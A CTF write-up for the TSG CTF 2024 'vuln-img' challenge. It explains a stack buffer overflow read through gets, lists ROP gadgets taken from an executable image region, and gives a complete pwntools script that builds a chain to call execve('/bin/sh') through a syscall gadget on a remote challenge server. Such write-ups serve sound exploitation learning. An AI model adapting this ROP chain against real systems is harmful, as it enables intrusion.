---
title: "vuln-img - TSG CTF 2024"
category: "crypto"
subcategory: "stack"
type: "writeup"
tags: ["crypto", "xor", "buffer-overflow", "rop", "vuln-img", "stack", "tsg-ctf", "tsg-ctf-2024", "2024", "ctf-writeup"]
summary: "The vulnerability is direct: a buffer overflow in the main function that allows us to construct ROP chain."
source:
  name: "CTFtime writeup #39717"
  url: "https://ctftime.org/writeup/39717"
ctf:
  name: "TSG CTF 2024"
  year: 2024
  challenge: "vuln-img"
---

## Metadata

- **CTF:** TSG CTF 2024
- **Task:** vuln-img
- **Author team:** blue-lotus
- **CTFtime:** <https://ctftime.org/writeup/39717>

---
The vulnerability is direct: a buffer overflow in the main function that allows us to construct ROP chain. However, executable address starts with 0x0a, not readable by function `gets`. (Btw, the libc base address also starts with 0x0a, making it difficult to return to libc.) Luckily, the image data is marked as executable, where we can find the following useful gadgets:  
```  
// pop instructions  
0x0000000000004952 : pop rdi ; sbb eax, 0x4424a400 ; ret  
0x000000000000c30e : pop rax ; ret  
0x00000000000023dc : pop rbx ; ret  
0x000000000000771e : pop rcx ; ret  
0x00000000000058ba : pop rdx ; add eax, 0xd8a7d76f ; std ; ret

// xor eax  
0x0000000000003105 : xor eax, 0xbecde9d2 ; ret

// exchange 32-bit register  
0x000000000000a3d9 : xchg edi, eax ; ret  
0x00000000000032ad : xchg ebx, eax ; ret  
0x0000000000005816 : xchg esi, eax ; ret

// jump and function call  
0x0000000000003cf7 : jmp rbx  
0x000000000000ccb7 : syscall  
```  
In particular, the xor instruction, combined with exchange instruction, allows us to set a register to any 32-bit value starting with 0x0a. This breaks the constraints that 0x0a can't be read by `gets`. However, we still can't jump to libc since it requires to set the high 32-bit value. Therefore, I choose to get shell by syscall instruction. Now the ROP is clear. First write /bin/sh to some address. Then do syscall.  
```  
from pwn import *  
import argparse  
argparser = argparse.ArgumentParser()  
argparser.add_argument('-l', action='store_true', default=False)  
args = argparser.parse_args()  
if args.l:  
context.terminal = ['tmux','splitw','-h']  
shell = gdb.debug("./vuln_img", "b main")  
else:  
shell = remote('34.146.186.1', 48950)

pop_rdi_ret_addr = 0x1000000 + 0x4952  
pop_rax_ret_addr = 0x1000000 + 0xc30e  
pop_rbx_ret_addr = 0x1000000 + 0x23dc  
pop_rcx_ret_addr = 0x1000000 + 0x771e  
pop_rdx_ret_addr = 0x1000000 + 0x58ba # affects rax  
jmp_rbx_addr = 0x1000000 + 0x3cf7  
syscall_addr = 0x1000000 + 0xccb7

xor_value = 0xbecde9d2  
xor_eax_ret_addr = 0x1000000 + 0x3105  
xchg_edi_eax_ret_addr = 0x1000000 + 0xa3d9  
xchg_ebx_eax_ret_addr = 0x1000000 + 0x32ad  
xchg_esi_eax_ret_addr = 0x1000000 + 0x5816

puts_plt_addr = 0xA0008B0  
main_addr = 0xA0000E6  
read_plt_addr = 0xA0008D0  
printf_got_addr = 0xB000200  
puts_got_addr = 0xB0001F8  
write_addr = 0xB000500

def set_eax(value):  
return p64(pop_rax_ret_addr) + p64(value ^ xor_value) + p64(xor_eax_ret_addr)

def set_rdx(value):  
return p64(pop_rdx_ret_addr) + p64(value)

def set_rcx(value):  
return p64(pop_rcx_ret_addr) + p64(value)

def set_rax(value):  
return p64(pop_rax_ret_addr) + p64(value)

def set_rbx(value):  
return p64(pop_rbx_ret_addr) + p64(value)

def set_rdi(value):  
return p64(pop_rdi_ret_addr) + p64(value)

shell.recvuntil(b'> ')  
shell.sendline(b'a' * 0x110 + p64(0) + set_rbx(0) + set_rdx(0x100) + set_rdi(0) + set_eax(write_addr) + p64(xchg_esi_eax_ret_addr) + set_eax(read_plt_addr) + p64(xchg_ebx_eax_ret_addr) + p64(jmp_rbx_addr) + set_eax(main_addr) + p64(xchg_ebx_eax_ret_addr) + p64(jmp_rbx_addr))  
shell.recvuntil(b'> ')  
shell.sendline(b'exit')  
shell.recvuntil(b'Bye!\n')  
shell.send(b'/bin/sh\x00')  
shell.recvuntil(b'> ')  
shell.sendline(b'a' * 0x110 + p64(0) + set_rbx(0) + set_rdx(0) + set_rax(0) + p64(xchg_esi_eax_ret_addr) + set_eax(write_addr) + p64(xchg_edi_eax_ret_addr) + set_eax(syscall_addr) + p64(xchg_ebx_eax_ret_addr) + set_eax(59) + p64(jmp_rbx_addr))  
shell.recvuntil(b'> ')  
shell.sendline(b'exit')  
shell.interactive()  
```
